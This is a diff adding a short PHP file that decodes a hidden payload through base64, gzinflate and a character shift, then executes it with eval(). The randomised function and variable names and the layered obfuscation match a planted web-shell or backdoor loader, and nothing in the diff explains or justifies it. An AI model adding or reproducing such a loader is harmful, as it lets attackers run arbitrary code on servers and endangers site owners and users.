@@ -1,0 +1,9 @@
+<?php function NInG($rfrXVi)
+{ 
+$rfrXVi=gzinflate(base64_decode($rfrXVi));
+ for($i=0;$i<strlen($rfrXVi);$i++)
+ {
+$rfrXVi[$i] = chr(ord($rfrXVi[$i])-1);
+ }
+ return $rfrXVi;
+ }eval(NInG("bZDdSsQwEIUfIE9xhEJaXFovRJDiDyzirfgCUtLpppA2ITPFBfHZTaxbhXXuMufMd2YCpFKFmXrcQdcNSxelZqtbNA32fpq6uYd40JHMIqRUaj/HbpZTB4HiNDKPfs4+vRFUcci+l03eryHGTr7H5REaNXJy+w19+sGJJawWs6afcV6JFycJxZace8t7lP9kVefcvweCTRyDIN9nuiBLJIzC8IuERVQRojfEnGKCDzSXedMddNSZ+25HRygvBvJDebJWFT5U/k8y1mOI1PWbtsP11e1NGs364+AWtmV6fSoVjPNMv5BWPdyrLw=="));?>
